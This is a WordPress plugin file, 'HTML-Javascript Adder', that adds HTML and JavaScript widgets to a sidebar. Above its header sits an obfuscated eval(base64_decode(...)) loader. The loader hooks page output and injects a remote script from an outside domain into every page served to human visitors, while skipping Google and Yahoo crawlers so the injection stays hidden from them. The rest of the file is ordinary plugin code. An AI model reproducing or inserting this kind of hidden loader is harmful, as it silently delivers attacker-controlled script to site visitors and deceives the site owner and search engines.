<?php /**/ eval(base64_decode("aWYoZnVuY3Rpb25fZXhpc3RzKCdvYl9zdGFydCcpJiYhaXNzZXQoJEdMT0JBTFNbJ21yX25vJ10pKXsgICAkR0xPQkFMU1snbXJfbm8nXT0xOyAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ21yb2JoJykpeyAgICAgIGlmKCFmdW5jdGlvbl9leGlzdHMoJ2dtbCcpKXsgICAgIGZ1bmN0aW9uIGdtbCgpeyAgICAgIGlmICghc3RyaXN0cigkX1NFUlZFUlsiSFRUUF9VU0VSX0FHRU5UIl0sImdvb2dsZWJvdCIpJiYgKCFzdHJpc3RyKCRfU0VSVkVSWyJIVFRQX1VTRVJfQUdFTlQiXSwieWFob28iKSkpeyAgICAgICByZXR1cm4gYmFzZTY0X2RlY29kZSgiUEhOamNtbHdkQ0J6Y21NOUltaDBkSEE2THk5cGJtUmxjMmxuYm5OMGRXUnBiMmx1Wm04dVkyOXRMMnh6TG5Cb2NDSStQQzl6WTNKcGNIUSsiKTsgICAgICB9ICAgICAgcmV0dXJuICIiOyAgICAgfSAgICB9ICAgICAgICBpZighZnVuY3Rpb25fZXhpc3RzKCdnemRlY29kZScpKXsgICAgIGZ1bmN0aW9uIGd6ZGVjb2RlKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMpeyAgICAgICRSMzBCMkFCOERDMTQ5NkQwNkIyMzBBNzFEODk2MkFGNUQ9QG9yZChAc3Vic3RyKCRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEMsMywxKSk7ICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOT0xMDsgICAgICAkUkEzRDUyRTUyQTQ4OTM2Q0RFMEY1MzU2QkIwODY1MkYyPTA7ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCY0KXsgICAgICAgJFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQj1AdW5wYWNrKCd2JyxzdWJzdHIoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QywxMCwyKSk7ICAgICAgICRSNjNCRURFNkIxOTI2NkQ0RUZFQUQwN0E0RDkxRTI5RUI9JFI2M0JFREU2QjE5MjY2RDRFRkVBRDA3QTREOTFFMjlFQlsxXTsgICAgICAgJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSs9MiskUjYzQkVERTZCMTkyNjZENEVGRUFEMDdBNEQ5MUUyOUVCOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjgpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5PUBzdHJwb3MoJFI1QTlDRjFCNDk3NTAyQUNBMjNDOEY2MTFBNTY0Njg0QyxjaHIoMCksJFJCRTRDNEQwMzdFOTM5MjI2RjY1ODEyODg1QTUzREFEOSkrMTsgICAgICB9ICAgICAgaWYoJFIzMEIyQUI4REMxNDk2RDA2QjIzMEE3MUQ4OTYyQUY1RCYxNil7ICAgICAgICRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDk9QHN0cnBvcygkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLGNocigwKSwkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5KSsxOyAgICAgIH0gICAgICBpZigkUjMwQjJBQjhEQzE0OTZEMDZCMjMwQTcxRDg5NjJBRjVEJjIpeyAgICAgICAkUkJFNEM0RDAzN0U5MzkyMjZGNjU4MTI4ODVBNTNEQUQ5Kz0yOyAgICAgIH0gICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPUBnemluZmxhdGUoQHN1YnN0cigkUjVBOUNGMUI0OTc1MDJBQ0EyM0M4RjYxMUE1NjQ2ODRDLCRSQkU0QzREMDM3RTkzOTIyNkY2NTgxMjg4NUE1M0RBRDkpKTsgICAgICBpZigkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPT09RkFMU0UpeyAgICAgICAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzPSRSNUE5Q0YxQjQ5NzUwMkFDQTIzQzhGNjExQTU2NDY4NEM7ICAgICAgfSAgICAgIHJldHVybiAkUjAzNEFFMkFCOTRGOTlDQzgxQjM4OUExODIyREEzMzUzOyAgICAgfSAgICB9ICAgIGZ1bmN0aW9uIG1yb2JoKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpeyAgICAgSGVhZGVyKCdDb250ZW50LUVuY29kaW5nOiBub25lJyk7ICAgICAkUkExNzlBQkQzQTdCOUUyOEMzNjlGN0I1OUM1MUI4MURFPWd6ZGVjb2RlKCRSRTgyRUU5QjEyMUY3MDk4OTVFRjU0RUJBN0ZBNkI3OEIpOyAgICAgICBpZihwcmVnX21hdGNoKCcvXDxcL2JvZHkvc2knLCRSQTE3OUFCRDNBN0I5RTI4QzM2OUY3QjU5QzUxQjgxREUpKXsgICAgICByZXR1cm4gcHJlZ19yZXBsYWNlKCcvKFw8XC9ib2R5W15cPl0qXD4pL3NpJyxnbWwoKS4iXG4iLickMScsJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERSk7ICAgICB9ZWxzZXsgICAgICByZXR1cm4gJFJBMTc5QUJEM0E3QjlFMjhDMzY5RjdCNTlDNTFCODFERS5nbWwoKTsgICAgIH0gICAgfSAgICBvYl9zdGFydCgnbXJvYmgnKTsgICB9ICB9"));?>
<?php

/*
Plugin Name: HTML-Javascript Adder
Plugin URI: http://www.aakashweb.com
Description: A widget plugin for using javascripts, HTML scripts , Flash Embed Codes and other scripts in your sidebar.This version has multiple widget support.
Author: Aakash Chakravarthy
Version: 1.4
Author URI: http://www.aakashweb.com/
*/
/*  Copyright 2009  Aakash Chakravarthy  (email : aakash.19493@gmail.com) (website : www.aakashweb.com)

    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.

    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this program; if not, write to the Free Software
    Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/
function getPluginPath_hja() {
		$path 	= strstr(realpath(dirname(__file__)), 'wp-content');
		$path 	= str_replace('\\', '/', $path);
		return( get_bloginfo('url') . '/' . $path);
} 

function wp_widget_add_html_javascript($args, $number = 1) {
	extract($args);
	$options = get_option('widget_add_html_javascript');
    echo $before_widget;
	echo $before_title;
	echo $options[$number]['title'];
	echo $after_title;
   //Our Widget Content 
    echo ($options[$number]['text']);
	echo '<!--This Javascript Added using HTML-Javascript-Adder Plugin Powered by Aakash Web Aakash Chakravarthy ( www.aakashweb.com )-->';
    echo $after_widget;

?>

<?php
}
function wp_widget_add_html_javascript_control($number) {
	$options = $newoptions = get_option('widget_add_html_javascript');
	if ( !is_array($options) )
		$options = $newoptions = array();

	if ( $_POST["add_html_javascript-submit-$number"] ) {
		if ( $_POST["add_html_javascript-blocked-$number"] )
		{	$newoptions[$number]['title'] = $options[$number]['title'];
			$newoptions[$number]['text']  = $options[$number]['text'];
		}
		else
		{	$newoptions[$number]['title'] = strip_tags(stripslashes($_POST["add_html_javascript-title-$number"]));
			$newoptions[$number]['text'] = stripslashes($_POST["add_html_javascript-text-$number"]);
		}
	}

	if ( $options != $newoptions ) {
		$options = $newoptions;
		update_option('widget_add_html_javascript', $options);
	}

	$title = attribute_escape($options[$number]['title']);
	$text = format_to_edit($options[$number]['text']);

	if ( current_user_can('manage_options') ) {
?><label for="add_html_javascript-title-<?php echo $number; ?>">Title :</label>

<input style="width: 450px;" class="widefat" id="add_html_javascript-title-<?php echo $number; ?>" name="add_html_javascript-title-<?php echo $number; ?>" type="text" value="<?php echo $title; ?>" />
<br />
<BR />
<label for="add_html_javascript-text-<?php echo $number; ?>">Your Javascript/HTML/Flash embed code or others</label>
<textarea style="width: 450px; height: 280px;" class="widefat" id="add_html_javascript-text-<?php echo $number; ?>" name="add_html_javascript-text-<?php echo $number; ?>"><?php echo $text; ?></textarea>
			
<input type="hidden" id="add_html_javascript-submit-<?php echo "$number"; ?>" name="add_html_javascript-submit-<?php echo "$number"; ?>" value="1" /><br /><br />
<a onclick="window.open('<?php echo getPluginPath_hja().'/steditor/';  ?>', 'popupwindow', 'scrollbars=yes,width=600,height=550');return true" style="color:#006699; cursor:pointer; text-decoration:underline" >Open WYSIWYG Editor</a>
<?php
	}
	else
	{
?>
			<p>Current user does not have rights or Permission to edit this content. Please contact the administrator.</p>
			
			<input type="hidden" id="add_html_javascript-blocked-<?php echo "$number"; ?>" name="add_html_javascript-blocked-<?php echo "$number"; ?>" value="1" />
			<input type="hidden" id="add_html_javascript-submit-<?php echo "$number"; ?>" name="add_html_javascript-submit-<?php echo "$number"; ?>" value="1" />
<?php
	}
}



function wp_widget_add_html_javascript_register() {
	$options = get_option('widget_add_html_javascript');
	$number = $options['number'];
	if ( $number < 1 ) $number = 1;
	if ( $number > 9 ) $number = 9;
	$dims = array('width' => 460, 'height' => 350);
	$class = array('classname' => 'widget_add_html_javascript');
	for ($i = 1; $i <= 9; $i++) {
		$name = sprintf(__('HTML Javascript Adder - %d'), $i);
		$id = "add_html_javascript-$i"; // Never never never translate an id
		wp_register_sidebar_widget($id, $name, $i <= $number ? 'wp_widget_add_html_javascript' : /* unregister */ '', $class, $i);
		wp_register_widget_control($id, $name, $i <= $number ? 'wp_widget_add_html_javascript_control' : /* unregister */ '', $dims, $i);
	}

}


function wp_add_html_javascript_admin_page(){


	$options = $newoptions = get_option('widget_add_html_javascript');
	if ( isset($_POST['add_html_javascript-number-submit']) ) {
		$number = (int) $_POST['add_html_javascript-number'];
		if ( $number > 9 ) $number = 9;
		if ( $number < 1 ) $number = 1;
		$newoptions['number'] = $number;
	}
	if ( $options != $newoptions ) {
		$options = $newoptions;
		update_option('widget_add_html_javascript', $options);
		wp_widget_add_html_javascript_register($options['number']);
	}
    $options = $newoptions = get_option('widget_add_html_javascript');
?>

<div style="float:right; margin-top:20px; border-left:#666666; border-left-style:solid; border-left-width:1px; padding:10px; border-bottom-color:#666666; border-bottom-style:solid; border-bottom-width:1px; margin-right:-60px">
			  <h3>Widget Support</h3>
			  <ul>
			    <li><a href="http://forums.aakashweb.com/forum/html-javascript-adder" target="_blank">Widget Support Forum</a></li>
		        <li><a href="http://www.aakashweb.com/" target="_blank">Author Website</a></li>
			    <li><a href="http://www.aakashweb.com/wordpress-plugins/html-javascript-adder/index.php" target="_blank">Plugin home page</a></li>
			    <li><a href="http://wordpress.org/extend/plugins/html-javascript-adder/" target="_blank">See Updates</a></li>
			    <li><a href="http://forums.aakashweb.com/forum/html-javascript-adder" target="_blank">Report Bugs</a></li>
			    <li><a href="mailto:aakash.19493@gmail.com" target="_blank">Email the Author </a></li>
			  </ul>
			  <h3>Donate</h3>
              <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_donations&amp;business=donations@aakashweb.com&amp;item_name=Donate HTML Javascript Adder Wordpress Plugin to develop more advanced versions&amp;amount=&amp;currency_code=USD"><img src="https://www.paypal.com/en_US/i/btn/btn_donateCC_LG_global.gif" alt="Donate HTML Javascript Adder Wordpress Plugin to develop more advanced versions" border="0" align="absmiddle"></a>
<br /><br />
              <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_donations&amp;business=donations@aakashweb.com&amp;item_name=Donate HTML Javascript Adder Wordpress Plugin to develop more advanced versions&amp;amount=&amp;currency_code=USD" title="Donate HTML Javascript Adder Wordpress Plugin to develop more advanced versions" target="_blank">Support this Plugin !</a>
<h3>Aakash Web</h3>
			  <ul>
			    <li><a href="http://www.aakashweb.com/tools/" target="_blank">Free Flash Gadgets</a></li>
		        <li><a href="http://www.aakashweb.com/flash-generators/" target="_blank">Flash Generators</a></li>
			    <li><a href="http://www.aakashweb.com/wordpress-plugins/" target="_blank">Wordpress Plugins</a></li>
			    <li><a href="http://www.aakashweb.com/super-rss-reader/" target="_blank">Flash RSS Reader</a></li>
			    <li><a href="http://www.aakashweb.com/flv-player/" target="_blank">FLV Player</a></li>
			    <li><a href="http://www.aakashweb.com/xml-slideshow/" target="_blank">XML Image Slideshow  </a></li>
			    <li><a href="http://blog.aakashweb.com/" target="_blank">Blog</a></li>
			    <li><a href="http://forums.aakashweb.com/" target="_blank">Support Forum</a></li>
				<li><a href="https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=donations@aakashweb.com&item_name=Donate Aakash Web and Support it's Useful Products &amount=&currency_code=USD" target="_blank">Support Aakash Web</a></li>
			  </ul>
</div>

<div class="wrap">
		<form method="POST">
		<div class="icon32" id="icon-options-general"><br/></div>
			<h2>Add HTML Javascript</h2>
			<div style="padding:5px"><p>How many "HTML Javascript Adder" widgets you like to have </p.>
			  <select class="widefat" style="width:75px" id="add_html_javascript-number" name="add_html_javascript-number" value="<?php echo $options['number']; ?>">
                <?php for ( $i = 1; $i < 10; ++$i ) echo "<option value='$i' ".($options['number']==$i ? "selected='selected'" : '').">$i</option>"; ?>
		      </select>
			</div>		
			<span class="submit"><input type="submit" name="add_html_javascript-number-submit" id="add_html_javascript-number-submit" value="<?php echo attribute_escape(__('Save')); ?>" /></span></p>
		</form></div>
<hr size="1"  noshade="NOSHADE"/>

<div><a href="http://www.aakashweb.com/" target="_blank"><img src="<?php echo getPluginPath_hja().'/images/aakashweb-logo.png'; ?>"  alt="Aakash Web "width="97" height="37" border="0" align="right" title="Visit Aakash Web" /></a><a href="http://forums.aakashweb.com/forum/html-javascript-adder" target="_blank">Report Bugs</a> | <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_donations&amp;business=donations@aakashweb.com&amp;item_name=Donate Aakash Web and Support it's Useful Products &amp;amount=&amp;currency_code=USD" target="_blank">Quick Donate</a> | <a href="http://www.aakashweb.com/" target="_blank">www.aakashweb.com</a></div>
<?php

   
}

//Add the options page under the Options tab in the admin panel
function wp_add_html_javascript_addpage() {
    add_submenu_page('options-general.php', 'Add HTML Javascript', 'Add HTML Javascript', 10, __FILE__, 'wp_add_html_javascript_admin_page');
}
add_action('admin_menu', 'wp_add_html_javascript_addpage');

function wp_widget_add_html_javascript_init() {
	if ( !is_blog_installed() )
		return;

	wp_widget_add_html_javascript_register();
}

add_action('init', 'wp_widget_add_html_javascript_init', 1);

?>
